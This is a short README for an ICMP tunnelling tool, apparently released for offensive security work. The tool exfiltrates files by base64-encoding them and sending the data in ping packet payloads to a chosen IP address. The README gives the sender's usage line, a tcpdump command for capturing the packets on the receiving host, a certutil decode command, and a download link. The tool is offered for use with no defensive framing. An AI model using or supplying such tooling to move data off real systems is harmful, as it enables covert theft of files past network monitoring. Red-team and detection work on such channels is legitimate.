# Data Ex-filteration over ICMP Tunnel

__icmp_transmitter.exe__ is an executable used to send files on one system to another using icmp ping packets. The tool first converts the file(an exe, image, document etc) to base64 encoded text. This will then send the ping requests each with 64 characters of data taken from the base64 encoded text file. The tools needs a packet capture softwares on the other side to capture and record all the ping packets as .pcap or .txt files. Use the parser.sh to quickly parse the pcap file and have the text file with base64 encoded data. Once this is done, use certutil to convert back the text file into respective file format.

### Usage:

icmp_transmitter.exe "input_file_to_be_sent" "IP_address_to_be_sent"

at the server end:
 
run tcpdump. Use the following command :

```sudo tcpdump -i eth0 icmp and icmp[icmptype]=icmp-echo -XX -vvv -w output.txt```

Use certutil to decode the base64 data to respective format

```certutil -decode "base_64_encoded_textfile" "file.extention"```

The files and source code can be downloaded from: https://github.com/NotSoSecure/icmp_tunnel_ex_filtrate/releases
